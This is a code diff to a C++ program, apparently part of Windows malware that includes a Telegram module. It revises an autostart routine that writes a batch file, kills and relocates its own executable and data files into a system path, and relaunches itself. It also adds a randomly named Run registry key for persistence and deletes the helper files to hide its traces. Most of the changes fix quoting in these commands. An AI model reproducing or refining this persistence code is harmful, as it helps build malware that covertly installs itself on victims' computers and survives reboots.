@@ -6,7 +6,6 @@
 #include "telegram.h"
 #include "tools.h"
 
-//need to delete o.bat
 void autostart() {
     std::string path = PATH;
     int find = path.find("$sysdisk$");
@@ -28,23 +27,24 @@ void autostart() {
 
         std::fstream file;
         file.open("o.bat", std::ios::out);
-        file << "TASKKILL /F /IM " << tools::get_exe() << std::endl
-            << "move " << tools::get_exe() << +" " + path << std::endl
-            << "move " << DATA_FILENAME << +" " + path << std::endl
-            << "move " << "shitoo " << path << std::endl
-            << "start " + path + "/" + tools::get_exe() << std::endl
+        file << "TASKKILL /F /IM \"" << tools::get_exe() << "\"\n"
+            << "move \"" << tools::get_exe() << "\"" << " \"" << path << "\"\n"
+            << "move \"" << DATA_FILENAME << "\"" << " \"" << path << "\"\n"
+            << "move " << "\"shitoo\" \"" << path << "\"\n"
+            << "cd " << path << std::endl
+            << "start " << tools::get_exe()<<std::endl
             << "exit";
         file.close();
 
         //if there's already no key for autosrat then it adds one
-        std::string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f " + tools::get_exe();
+        std::string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f \"" + path + "\\" + tools::get_exe() + "\"";
         if (tools::cmd_output(s.c_str()).find("End of search: 0 match(es) found.") != std::string::npos) {
             std::cout << "Adding new key for autostart\n";
-            std::string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + tools::random_string(16) + " /t REG_SZ /d " + path + "\\" + tools::get_exe();
+            std::string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + tools::random_string(16) + " /t REG_SZ /d \"" + path + "\\" + tools::get_exe() + "\"";
             system(cmd.c_str());
         }
         file.open("shitoo", std::ios::out);
-        file << tools::get_path() + "o.bat";
+        file << "\""<<tools::get_path().substr(0, tools::get_path().size() - tools::get_exe().size()) << "o.bat\"";
         file.close();
         system("start /min o.bat");
     }
@@ -55,7 +55,7 @@ void autostart() {
         std::getline(file, path2);
         file.close();
 
-        system(std::string("del \"" + path + "\\" + "shitoo\"").c_str());
-        system(std::string("del \"" + path2 + "\"").c_str());
+        tools::remove(path + "\\" + "shitoo");
+        tools::remove(path2);
     }
 }
